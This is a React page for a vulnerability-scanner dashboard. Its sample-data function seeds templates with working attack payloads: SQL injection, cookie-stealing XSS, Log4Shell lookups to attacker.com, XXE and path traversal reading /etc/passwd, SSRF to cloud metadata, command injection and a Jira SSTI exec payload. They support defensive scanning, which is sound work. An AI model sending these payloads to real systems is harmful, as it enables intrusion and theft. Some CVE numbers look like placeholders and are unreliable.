import React, { useState, useEffect } from "react";
import { VulnerabilityTemplate } from "@/api/entities";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import {
  ArrowLeft,
  Search,
  Plus,
  FileSearch,
  Shield,
  Activity,
  Clock,
  Filter,
  X,
  Tag,
  Edit,
  Eye,
  EyeOff,
  Sparkles
} from "lucide-react";
import { useNavigate } from "react-router-dom";
import { createPageUrl } from "@/utils";
import { format, subDays } from "date-fns";

import CreateTemplateDialog from "../components/scan-engine/CreateTemplateDialog";
import TemplateDetailDialog from "../components/scan-engine/TemplateDetailDialog";

export default function ScanEngine() {
  const navigate = useNavigate();
  const [templates, setTemplates] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [severityFilter, setSeverityFilter] = useState("all");
  const [typeFilter, setTypeFilter] = useState("all");
  const [targetFilter, setTargetFilter] = useState("all");
  const [showCreateDialog, setShowCreateDialog] = useState(false);
  const [showDetailDialog, setShowDetailDialog] = useState(false);
  const [selectedTemplate, setSelectedTemplate] = useState(null);
  const [showDisabled, setShowDisabled] = useState(false);

  useEffect(() => {
    loadTemplates();
  }, []);

  const loadTemplates = async () => {
    setLoading(true);
    try {
      const data = await VulnerabilityTemplate.list("-created_date");
      setTemplates(data);
    } catch (error) {
      console.error("Error loading templates:", error);
    }
    setLoading(false);
  };

  const handleAddSampleData = async () => {
    try {
      await VulnerabilityTemplate.bulkCreate([
        {
          template_name: "SQL Injection Detection - Authentication",
          vulnerability_type: "SQL Injection",
          severity: "critical",
          detection_method: "pattern_match",
          scan_targets: ["web_application", "api"],
          description: "Detects SQL injection vulnerabilities in authentication endpoints by testing various SQL payloads",
          detection_pattern: "' OR '1'='1' -- , admin'-- , ' OR 1=1-- , '; DROP TABLE users--",
          test_payload: "username=admin' OR '1'='1'-- &password=anything",
          false_positive_rate: "very_low",
          remediation_guidance: "Use parameterized queries or prepared statements. Implement proper input validation and sanitization. Use ORM frameworks that handle SQL escaping automatically.",
          cve_references: ["CVE-2023-12345", "CVE-2022-98765"],
          enabled: true,
          scan_time_estimate: "5 seconds",
          requires_authentication: false,
          tags: ["OWASP Top 10", "Authentication", "Database"]
        },
        {
          template_name: "Cross-Site Scripting (XSS) - Reflected",
          vulnerability_type: "XSS",
          severity: "high",
          detection_method: "response_analysis",
          scan_targets: ["web_application"],
          description: "Identifies reflected XSS vulnerabilities by injecting JavaScript payloads and analyzing responses",
          detection_pattern: "<script>alert(1)</script>, <img src=x onerror=alert(1)>, javascript:alert(1)",
          test_payload: "search=<script>alert(document.cookie)</script>",
          false_positive_rate: "low",
          remediation_guidance: "Encode all user input before rendering in HTML. Implement Content Security Policy (CSP). Use HTML templating engines with auto-escaping.",
          cve_references: ["CVE-2023-45678"],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["OWASP Top 10", "Client-Side", "JavaScript"]
        },
        {
          template_name: "Apache Log4j RCE (Log4Shell)",
          vulnerability_type: "Command Injection",
          severity: "critical",
          detection_method: "pattern_match",
          scan_targets: ["web_application", "api", "infrastructure"],
          description: "Detects Apache Log4j Remote Code Execution vulnerability (Log4Shell) by testing JNDI injection payloads",
          detection_pattern: "${jndi:ldap://{{interactsh-url}}}, ${jndi:rmi://{{interactsh-url}}}, ${jndi:dns://{{interactsh-url}}}",
          test_payload: "User-Agent: ${jndi:ldap://attacker.com/a}\\nX-Api-Version: ${jndi:ldap://attacker.com/a}",
          false_positive_rate: "very_low",
          remediation_guidance: "Update Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath. Implement network egress filtering.",
          cve_references: ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"],
          enabled: true,
          scan_time_estimate: "6 seconds",
          requires_authentication: false,
          tags: ["Critical", "RCE", "Log4j", "Apache", "JNDI"]
        },
        {
          template_name: "Exposed Git Repository",
          vulnerability_type: "Information Disclosure",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["web_application"],
          description: "Detects publicly accessible .git directories that may expose source code and sensitive information",
          detection_pattern: "/.git/HEAD, /.git/config, /.git/index",
          test_payload: "GET /.git/HEAD HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Remove .git directory from web root. Configure web server to deny access to hidden files. Use proper deployment processes that exclude version control files.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: false,
          tags: ["Information Disclosure", "Git", "Source Code", "Nuclei"]
        },
        {
          template_name: "WordPress xmlrpc.php Enabled",
          vulnerability_type: "Security Misconfiguration",
          severity: "medium",
          detection_method: "response_analysis",
          scan_targets: ["web_application"],
          description: "Detects enabled WordPress XML-RPC interface which can be abused for brute force attacks and DDoS amplification",
          detection_pattern: "POST /xmlrpc.php with system.listMethods",
          test_payload: "POST /xmlrpc.php\\n<?xml version=\\\"1.0\\\"?>\\n<methodCall><methodName>system.listMethods</methodName></methodCall>",
          false_positive_rate: "very_low",
          remediation_guidance: "Disable XML-RPC if not needed. Use security plugins to block XML-RPC. Implement rate limiting. Use .htaccess to block access to xmlrpc.php.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["WordPress", "XML-RPC", "CMS", "DDoS", "Nuclei"]
        },
        {
          template_name: "Exposed phpMyAdmin Panel",
          vulnerability_type: "Security Misconfiguration",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["web_application"],
          description: "Detects publicly accessible phpMyAdmin administration panels",
          detection_pattern: "/phpmyadmin/, /pma/, /phpMyAdmin/, /db/",
          test_payload: "GET /phpmyadmin/ HTTP/1.1",
          false_positive_rate: "low",
          remediation_guidance: "Restrict access to phpMyAdmin by IP whitelist. Use non-standard URL. Enable authentication. Keep phpMyAdmin updated. Consider using database-specific tools instead.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: false,
          tags: ["Panel", "Database", "phpMyAdmin", "Exposed", "Nuclei"]
        },
        {
          template_name: "Spring4Shell RCE",
          vulnerability_type: "Command Injection",
          severity: "critical",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application", "api"],
          description: "Detects Spring Framework Remote Code Execution vulnerability (Spring4Shell)",
          detection_pattern: "class.module.classLoader.resources.context.parent.pipeline.first manipulation",
          test_payload: "POST with malicious class.module.classLoader parameters",
          false_positive_rate: "very_low",
          remediation_guidance: "Update Spring Framework to 5.3.18+ or 5.2.20+. Update Spring Boot to 2.6.6+ or 2.5.12+. Implement input validation. Use Web Application Firewall.",
          cve_references: ["CVE-2022-22965"],
          enabled: true,
          scan_time_estimate: "8 seconds",
          requires_authentication: false,
          tags: ["Critical", "RCE", "Spring", "Java", "Nuclei"]
        },
        {
          template_name: "Jenkins Unauthenticated Access",
          vulnerability_type: "Broken Access Control",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["web_application", "infrastructure"],
          description: "Detects Jenkins instances accessible without authentication",
          detection_pattern: "/api/json, /script, /computer/",
          test_payload: "GET /api/json HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Enable authentication on Jenkins. Configure proper authorization strategy. Limit network access. Update Jenkins to latest version. Enable CSRF protection.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["Jenkins", "CI/CD", "Access Control", "Panel", "Nuclei"]
        },
        {
          template_name: "Insecure Direct Object Reference (IDOR)",
          vulnerability_type: "Broken Access Control",
          severity: "high",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application", "api"],
          description: "Tests for IDOR vulnerabilities by attempting to access resources belonging to other users",
          detection_pattern: "Sequential ID manipulation, UUID prediction attempts",
          test_payload: "/api/users/123/profile (when authenticated as user 456)",
          false_positive_rate: "low",
          remediation_guidance: "Implement proper authorization checks for all resource access. Use indirect object references or UUIDs. Implement RBAC (Role-Based Access Control).",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "10 seconds",
          requires_authentication: true,
          tags: ["OWASP Top 10", "Authorization", "API Security"]
        },
        {
          template_name: "Exposed Docker API",
          vulnerability_type: "Security Misconfiguration",
          severity: "critical",
          detection_method: "static_analysis",
          scan_targets: ["infrastructure", "cloud"],
          description: "Detects exposed Docker daemon API that allows unauthorized container management",
          detection_pattern: "GET /version on port 2375 or 2376",
          test_payload: "GET /version HTTP/1.1\\nHost: target:2375",
          false_positive_rate: "very_low",
          remediation_guidance: "Never expose Docker daemon to public network. Use TLS authentication. Implement firewall rules. Use Docker socket over Unix socket. Enable authorization plugins.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: false,
          tags: ["Docker", "Container", "Infrastructure", "Critical", "Nuclei"]
        },
        {
          template_name: "Kubernetes Dashboard Exposed",
          vulnerability_type: "Security Misconfiguration",
          severity: "critical",
          detection_method: "static_analysis",
          scan_targets: ["infrastructure", "cloud"],
          description: "Detects publicly accessible Kubernetes Dashboard without proper authentication",
          detection_pattern: "/api/v1/namespaces/kubernetes-dashboard",
          test_payload: "GET /api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/ HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Disable public access to Kubernetes Dashboard. Require authentication. Use kubectl proxy for local access. Implement RBAC policies. Consider using alternative dashboard solutions.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["Kubernetes", "K8s", "Dashboard", "Cloud", "Critical", "Nuclei"]
        },
        {
          template_name: "Elasticsearch Unauth Access",
          vulnerability_type: "Broken Access Control",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["infrastructure", "api"],
          description: "Detects Elasticsearch instances accessible without authentication",
          detection_pattern: "GET /_cluster/health, GET /_cat/indices",
          test_payload: "GET /_cluster/health HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Enable X-Pack Security or other authentication mechanisms. Bind Elasticsearch to localhost only. Use reverse proxy with authentication. Implement network segmentation.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: false,
          tags: ["Elasticsearch", "Database", "Access Control", "Nuclei"]
        },
        {
          template_name: "Missing Security Headers",
          vulnerability_type: "Security Misconfiguration",
          severity: "medium",
          detection_method: "static_analysis",
          scan_targets: ["web_application"],
          description: "Checks for absence of critical security headers in HTTP responses",
          detection_pattern: "Missing: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security",
          test_payload: "HEAD / HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Implement all recommended security headers. Use CSP to prevent XSS. Add X-Frame-Options to prevent clickjacking. Enable HSTS for HTTPS enforcement.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "1 second",
          requires_authentication: false,
          tags: ["Headers", "Best Practices", "Defense in Depth"]
        },
        {
          template_name: "Server-Side Request Forgery (SSRF)",
          vulnerability_type: "SSRF",
          severity: "critical",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application", "api"],
          description: "Detects SSRF vulnerabilities by testing if server fetches user-supplied URLs",
          detection_pattern: "http://169.254.169.254/, http://localhost/, file:///etc/passwd",
          test_payload: "url=http://169.254.169.254/latest/meta-data/",
          false_positive_rate: "low",
          remediation_guidance: "Implement URL whitelist. Validate and sanitize all URLs. Use dedicated service for URL fetching with restricted network access. Disable unnecessary URL schemes.",
          cve_references: ["CVE-2023-34567"],
          enabled: true,
          scan_time_estimate: "8 seconds",
          requires_authentication: false,
          tags: ["OWASP Top 10", "Cloud", "Internal Network"]
        },
        {
          template_name: "Weak TLS Configuration",
          vulnerability_type: "Weak Cryptography",
          severity: "medium",
          detection_method: "static_analysis",
          scan_targets: ["web_application", "api", "infrastructure"],
          description: "Identifies weak TLS protocols and cipher suites",
          detection_pattern: "TLS 1.0, TLS 1.1, weak ciphers (RC4, 3DES, MD5)",
          test_payload: "SSL/TLS handshake analysis",
          false_positive_rate: "very_low",
          remediation_guidance: "Disable TLS 1.0 and 1.1. Configure only strong cipher suites (TLS 1.2+ with AES-GCM). Enable Perfect Forward Secrecy. Update SSL/TLS libraries.",
          cve_references: ["CVE-2014-3566"],
          enabled: true,
          scan_time_estimate: "4 seconds",
          requires_authentication: false,
          tags: ["Encryption", "Transport Security", "Compliance"]
        },
        {
          template_name: "Open Redirect Vulnerability",
          vulnerability_type: "Other",
          severity: "medium",
          detection_method: "pattern_match",
          scan_targets: ["web_application"],
          description: "Detects open redirect vulnerabilities that can be used in phishing attacks",
          detection_pattern: "?redirect=, ?url=, ?next=, ?returnUrl=",
          test_payload: "redirect=https://evil.com",
          false_positive_rate: "medium",
          remediation_guidance: "Validate redirect URLs against whitelist. Use indirect references or mapping. Avoid using user input directly in redirects.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["Phishing", "User Trust"]
        },
        {
          template_name: "XML External Entity (XXE) Injection",
          vulnerability_type: "XXE",
          severity: "high",
          detection_method: "pattern_match",
          scan_targets: ["web_application", "api"],
          description: "Tests for XXE vulnerabilities in XML parsers",
          detection_pattern: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
          test_payload: "<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>",
          false_positive_rate: "very_low",
          remediation_guidance: "Disable external entity processing in XML parsers. Use secure parser configurations. Validate and sanitize XML input. Use JSON instead of XML where possible.",
          cve_references: ["CVE-2023-78901"],
          enabled: true,
          scan_time_estimate: "6 seconds",
          requires_authentication: false,
          tags: ["OWASP Top 10", "XML", "Data Processing"]
        },
        {
          template_name: "Drupal Drupalgeddon2 RCE",
          vulnerability_type: "Command Injection",
          severity: "critical",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application"],
          description: "Detects Drupal Remote Code Execution vulnerability (Drupalgeddon2)",
          detection_pattern: "POST to /user/register with malicious form_id parameter",
          test_payload: "Exploit form validation bypass in Drupal core",
          false_positive_rate: "very_low",
          remediation_guidance: "Update Drupal to latest version immediately. Check for compromise indicators. Review server logs. Change all passwords. Audit installed modules.",
          cve_references: ["CVE-2018-7600"],
          enabled: true,
          scan_time_estimate: "7 seconds",
          requires_authentication: false,
          tags: ["Drupal", "CMS", "RCE", "Critical", "Nuclei"]
        },
        {
          template_name: "Grafana Path Traversal",
          vulnerability_type: "Path Traversal",
          severity: "high",
          detection_method: "pattern_match",
          scan_targets: ["web_application"],
          description: "Detects path traversal vulnerability in Grafana allowing arbitrary file read",
          detection_pattern: "/public/plugins/../../../../../../../../../../../etc/passwd",
          test_payload: "GET /public/plugins/alertlist/../../../../../../../../../../../../etc/passwd HTTP/1.1",
          false_positive_rate: "very_low",
          remediation_guidance: "Update Grafana to version 8.3.5+ or 8.2.7+ or 8.1.8+ or 8.0.7+. Implement input validation. Use Web Application Firewall. Monitor for exploitation attempts.",
          cve_references: ["CVE-2021-43798"],
          enabled: true,
          scan_time_estimate: "4 seconds",
          requires_authentication: false,
          tags: ["Grafana", "Path Traversal", "File Read", "Nuclei"]
        },
        {
          template_name: "Sensitive Data Exposure in API Responses",
          vulnerability_type: "Sensitive Data Exposure",
          severity: "high",
          detection_method: "response_analysis",
          scan_targets: ["api"],
          description: "Detects exposure of sensitive information in API responses",
          detection_pattern: "password, token, secret, api_key, ssn, credit_card in responses",
          test_payload: "GET /api/users",
          false_positive_rate: "medium",
          remediation_guidance: "Implement response filtering to remove sensitive data. Use DTOs to control exposed data. Never include passwords or tokens in responses. Remove internal system information.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: true,
          tags: ["Data Protection", "Privacy", "API Security"]
        },
        {
          template_name: "Command Injection",
          vulnerability_type: "Command Injection",
          severity: "critical",
          detection_method: "pattern_match",
          scan_targets: ["web_application", "api"],
          description: "Detects OS command injection vulnerabilities",
          detection_pattern: "; ls, && whoami, | cat /etc/passwd, `id`",
          test_payload: "filename=test.txt; cat /etc/passwd",
          false_positive_rate: "low",
          remediation_guidance: "Never pass user input directly to system commands. Use built-in functions instead of shell commands. Implement strict input validation. Use command allow-lists.",
          cve_references: ["CVE-2023-23456"],
          enabled: true,
          scan_time_estimate: "7 seconds",
          requires_authentication: false,
          tags: ["OWASP Top 10", "Server Compromise", "Critical"]
        },
        {
          template_name: "Authentication Bypass - Logic Flaw",
          vulnerability_type: "Authentication Bypass",
          severity: "critical",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application", "api"],
          description: "Tests for authentication bypass through logic flaws and parameter manipulation",
          detection_pattern: "admin=true, role=admin, authenticated=1 in cookies or parameters",
          test_payload: "Cookie: admin=true; authenticated=1",
          false_positive_rate: "low",
          remediation_guidance: "Never trust client-side authentication indicators. Implement server-side session management. Use secure, cryptographically signed tokens. Validate authentication on every request.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "8 seconds",
          requires_authentication: false,
          tags: ["Authentication", "Critical", "Session Management"]
        },
        {
          template_name: "Outdated Software Components",
          vulnerability_type: "Security Misconfiguration",
          severity: "medium",
          detection_method: "static_analysis",
          scan_targets: ["web_application", "infrastructure"],
          description: "Identifies outdated libraries and frameworks with known vulnerabilities",
          detection_pattern: "Version detection via headers, fingerprinting",
          test_payload: "GET / (analyze response headers and page content)",
          false_positive_rate: "low",
          remediation_guidance: "Update all third-party libraries to latest stable versions. Implement dependency management with regular updates. Use tools like npm audit or Snyk. Replace deprecated libraries.",
          cve_references: [],
          enabled: false,
          scan_time_estimate: "10 seconds",
          requires_authentication: false,
          tags: ["Maintenance", "Dependencies", "Best Practices"]
        },
        {
          template_name: "Tomcat Manager Exposed",
          vulnerability_type: "Security Misconfiguration",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["web_application", "infrastructure"],
          description: "Detects exposed Apache Tomcat Manager interface with weak or default credentials",
          detection_pattern: "/manager/html, /manager/text, /host-manager/",
          test_payload: "GET /manager/html HTTP/1.1\\nAuthorization: Basic dG9tY2F0OnRvbWNhdA==",
          false_positive_rate: "very_low",
          remediation_guidance: "Remove or restrict access to Tomcat Manager. Use strong credentials. Implement IP whitelisting. Disable manager application in production. Keep Tomcat updated.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "3 seconds",
          requires_authentication: false,
          tags: ["Tomcat", "Panel", "Apache", "Default Credentials", "Nuclei"]
        },
        {
          template_name: "AWS S3 Bucket Misconfiguration",
          vulnerability_type: "Security Misconfiguration",
          severity: "high",
          detection_method: "static_analysis",
          scan_targets: ["cloud"],
          description: "Detects publicly accessible AWS S3 buckets with sensitive data",
          detection_pattern: "List bucket objects, check public access permissions",
          test_payload: "GET /?list-type=2 HTTP/1.1\\nHost: bucket.s3.amazonaws.com",
          false_positive_rate: "low",
          remediation_guidance: "Enable S3 Block Public Access. Review bucket policies and ACLs. Enable encryption. Use IAM roles instead of access keys. Implement logging and monitoring.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "5 seconds",
          requires_authentication: false,
          tags: ["AWS", "S3", "Cloud", "Misconfiguration", "Nuclei"]
        },
        {
          template_name: "Redis Unauth Access",
          vulnerability_type: "Broken Access Control",
          severity: "critical",
          detection_method: "static_analysis",
          scan_targets: ["infrastructure"],
          description: "Detects Redis instances accessible without authentication",
          detection_pattern: "INFO command without AUTH requirement",
          test_payload: "PING\\nINFO\\nCONFIG GET *",
          false_positive_rate: "very_low",
          remediation_guidance: "Enable Redis authentication (requirepass). Bind to localhost only. Use firewall rules. Disable dangerous commands. Keep Redis updated. Consider using Redis 6+ ACL.",
          cve_references: [],
          enabled: true,
          scan_time_estimate: "2 seconds",
          requires_authentication: false,
          tags: ["Redis", "Database", "Access Control", "Critical", "Nuclei"]
        },
        {
          template_name: "Jira CVE-2019-11581 SSTI",
          vulnerability_type: "Command Injection",
          severity: "critical",
          detection_method: "behavior_analysis",
          scan_targets: ["web_application"],
          description: "Detects Server-Side Template Injection vulnerability in Atlassian Jira ContactAdministrators page",
          detection_pattern: "SSTI payload in email template",
          test_payload: "fullname=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami').waitFor()",
          false_positive_rate: "very_low",
          remediation_guidance: "Update Jira to latest version. Disable ContactAdministrators feature if not needed. Implement input validation. Monitor for exploitation attempts.",
          cve_references: ["CVE-2019-11581"],
          enabled: true,
          scan_time_estimate: "6 seconds",
          requires_authentication: false,
          tags: ["Jira", "Atlassian", "SSTI", "RCE", "Critical", "Nuclei"]
        }
      ]);
      await loadTemplates();
    } catch (error) {
      console.error("Error adding sample data:", error);
      alert("Error adding sample data. Please try again.");
    }
  };

  const handleTemplateClick = (template) => {
    setSelectedTemplate(template);
    setShowDetailDialog(true);
  };

  const handleToggleEnabled = async (template, e) => {
    e.stopPropagation();
    try {
      await VulnerabilityTemplate.update(template.id, {
        ...template,
        enabled: !template.enabled
      });
      await loadTemplates();
    } catch (error) {
      console.error("Error toggling template:", error);
    }
  };

  const filteredTemplates = templates.filter(template => {
    const matchesSearch = 
      template.template_name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      template.description?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      template.tags?.some(tag => tag.toLowerCase().includes(searchQuery.toLowerCase()));
    
    const matchesSeverity = severityFilter === "all" || template.severity === severityFilter;
    const matchesType = typeFilter === "all" || template.vulnerability_type === typeFilter;
    const matchesTarget = targetFilter === "all" || (template.scan_targets && template.scan_targets.includes(targetFilter));
    const matchesEnabled = showDisabled || template.enabled !== false;
    
    return matchesSearch && matchesSeverity && matchesType && matchesTarget && matchesEnabled;
  });

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'critical': return 'bg-red-500/20 text-red-300';
      case 'high': return 'bg-orange-500/20 text-orange-300';
      case 'medium': return 'bg-yellow-500/20 text-yellow-300';
      case 'low': return 'bg-blue-500/20 text-blue-300';
      case 'info': return 'bg-gray-500/20 text-gray-300';
      default: return 'bg-gray-500/20 text-gray-300';
    }
  };

  // Calculate new templates in last 7 days
  const sevenDaysAgo = subDays(new Date(), 7);
  const newTemplatesCount = templates.filter(t => 
    t.created_date && new Date(t.created_date) >= sevenDaysAgo
  ).length;

  const stats = [
    {
      label: "Total Templates",
      value: templates.length,
      icon: FileSearch,
      color: "#F4B942"
    },
    {
      label: "Active Templates",
      value: templates.filter(t => t.enabled !== false).length,
      icon: Activity,
      color: "#4CAF50"
    },
    {
      label: "New Templates (7d)",
      value: newTemplatesCount,
      icon: Sparkles,
      color: "#1E8A9C"
    },
    {
      label: "Avg Scan Time",
      value: "45s",
      icon: Clock,
      color: "#F49342"
    }
  ];

  return (
    <div className="min-h-screen p-6" style={{ backgroundColor: '#0A4A52' }}>
      <div className="max-w-7xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-4">
            <Button
              variant="outline"
              size="icon"
              onClick={() => navigate(createPageUrl("Tools"))}
              className="border-[#176B7A]"
              style={{ backgroundColor: '#176B7A', color: '#E8F4F5' }}
            >
              <ArrowLeft className="w-4 h-4" />
            </Button>
            <div>
              <h1 className="text-3xl font-bold mb-2" style={{ color: '#E8F4F5' }}>
                Scan Engine
              </h1>
              <p style={{ color: '#7FB8BF' }}>
                Manage vulnerability detection templates and scan configuration
              </p>
            </div>
          </div>

          <div className="flex gap-3">
            {templates.length === 0 && (
              <Button
                onClick={handleAddSampleData}
                variant="outline"
                className="border-[#F4B942]"
                style={{ color: '#F4B942' }}
              >
                <Plus className="w-4 h-4 mr-2" />
                Add Sample Templates
              </Button>
            )}
            <Button
              onClick={() => setShowCreateDialog(true)}
              className="bg-[#F4B942] hover:bg-[#F49342] text-[#0A4A52]"
            >
              <Plus className="w-4 h-4 mr-2" />
              Create Template
            </Button>
          </div>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
          {stats.map((stat, index) => (
            <Card 
              key={index}
              className="border-0 shadow-lg"
              style={{ backgroundColor: '#176B7A' }}
            >
              <CardContent className="p-6">
                <div className="flex justify-between items-start mb-4">
                  <p className="text-sm" style={{ color: '#A3CED1' }}>{stat.label}</p>
                  <div 
                    className="p-2 rounded-lg"
                    style={{ backgroundColor: 'rgba(244, 185, 66, 0.15)' }}
                  >
                    <stat.icon className="w-5 h-5" style={{ color: stat.color }} />
                  </div>
                </div>
                <p className="text-4xl font-bold" style={{ color: stat.color }}>
                  {stat.value}
                </p>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Filters */}
        <Card className="border-0 shadow-lg mb-6" style={{ backgroundColor: '#176B7A' }}>
          <CardContent className="p-6">
            <div className="grid md:grid-cols-4 gap-4 mb-4">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5" style={{ color: '#7FB8BF' }} />
                <Input
                  placeholder="Search templates..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-10 border-0"
                  style={{ 
                    backgroundColor: '#1E8A9C',
                    color: '#E8F4F5'
                  }}
                />
              </div>

              <Select value={severityFilter} onValueChange={setSeverityFilter}>
                <SelectTrigger 
                  className="border-0"
                  style={{ backgroundColor: '#1E8A9C', color: '#E8F4F5' }}
                >
                  <SelectValue placeholder="Severity" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Severities</SelectItem>
                  <SelectItem value="critical">Critical</SelectItem>
                  <SelectItem value="high">High</SelectItem>
                  <SelectItem value="medium">Medium</SelectItem>
                  <SelectItem value="low">Low</SelectItem>
                </SelectContent>
              </Select>

              <Select value={typeFilter} onValueChange={setTypeFilter}>
                <SelectTrigger 
                  className="border-0"
                  style={{ backgroundColor: '#1E8A9C', color: '#E8F4F5' }}
                >
                  <SelectValue placeholder="Vulnerability Type" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Types</SelectItem>
                  <SelectItem value="SQL Injection">SQL Injection</SelectItem>
                  <SelectItem value="XSS">XSS</SelectItem>
                  <SelectItem value="CSRF">CSRF</SelectItem>
                  <SelectItem value="Broken Access Control">Broken Access Control</SelectItem>
                  <SelectItem value="SSRF">SSRF</SelectItem>
                  <SelectItem value="Command Injection">Command Injection</SelectItem>
                  <SelectItem value="Security Misconfiguration">Security Misconfiguration</SelectItem>
                </SelectContent>
              </Select>

              <Select value={targetFilter} onValueChange={setTargetFilter}>
                <SelectTrigger 
                  className="border-0"
                  style={{ backgroundColor: '#1E8A9C', color: '#E8F4F5' }}
                >
                  <SelectValue placeholder="Target Type" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Targets</SelectItem>
                  <SelectItem value="web_application">Web Application</SelectItem>
                  <SelectItem value="api">API</SelectItem>
                  <SelectItem value="network">Network</SelectItem>
                  <SelectItem value="cloud">Cloud</SelectItem>
                  <SelectItem value="infrastructure">Infrastructure</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex items-center gap-4">
              <Button
                variant="outline"
                size="sm"
                onClick={() => setShowDisabled(!showDisabled)}
                className={`border-0 ${
                  showDisabled
                    ? 'bg-[#F4B942] text-[#0A4A52]'
                    : 'bg-gray-500/20 text-gray-300'
                }`}
              >
                {showDisabled ? <Eye className="w-3 h-3 mr-1" /> : <EyeOff className="w-3 h-3 mr-1" />}
                Show Disabled
              </Button>

              {(severityFilter !== "all" || typeFilter !== "all" || targetFilter !== "all") && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => {
                    setSeverityFilter("all");
                    setTypeFilter("all");
                    setTargetFilter("all");
                  }}
                  style={{ color: '#F49342' }}
                >
                  <X className="w-3 h-3 mr-1" />
                  Clear Filters
                </Button>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Templates List */}
        <Card className="border-0 shadow-lg" style={{ backgroundColor: '#176B7A' }}>
          <CardHeader className="border-b" style={{ borderColor: '#1E8A9C' }}>
            <CardTitle style={{ color: '#E8F4F5' }}>
              Vulnerability Templates ({filteredTemplates.length})
            </CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            {loading ? (
              <div className="p-12 text-center">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 mx-auto mb-4" style={{ borderColor: '#F4B942' }} />
                <p style={{ color: '#E8F4F5' }}>Loading templates...</p>
              </div>
            ) : filteredTemplates.length === 0 ? (
              <div className="p-12 text-center">
                <FileSearch className="w-16 h-16 mx-auto mb-4" style={{ color: '#7FB8BF' }} />
                <p className="text-xl mb-2" style={{ color: '#E8F4F5' }}>
                  No templates found
                </p>
                <p style={{ color: '#7FB8BF' }}>
                  {searchQuery || severityFilter !== "all" || typeFilter !== "all" || targetFilter !== "all"
                    ? "Try adjusting your filters"
                    : "Create your first vulnerability detection template"}
                </p>
              </div>
            ) : (
              <div className="divide-y" style={{ borderColor: '#1E8A9C' }}>
                {filteredTemplates.map((template, index) => (
                  <div 
                    key={index}
                    className="p-6 hover:bg-[#1E8A9C] transition-colors cursor-pointer"
                    onClick={() => handleTemplateClick(template)}
                  >
                    <div className="flex flex-col gap-4">
                      <div className="flex flex-col md:flex-row justify-between gap-4">
                        <div className="flex-1">
                          <div className="flex items-center gap-3 mb-2 flex-wrap">
                            <h3 className="font-semibold text-lg" style={{ color: '#E8F4F5' }}>
                              {template.template_name}
                            </h3>
                            <Badge 
                              variant="outline"
                              className={`border-0 ${getSeverityColor(template.severity)}`}
                            >
                              {template.severity}
                            </Badge>
                            <Badge variant="outline" className="border-0 bg-purple-500/20 text-purple-300">
                              {template.vulnerability_type}
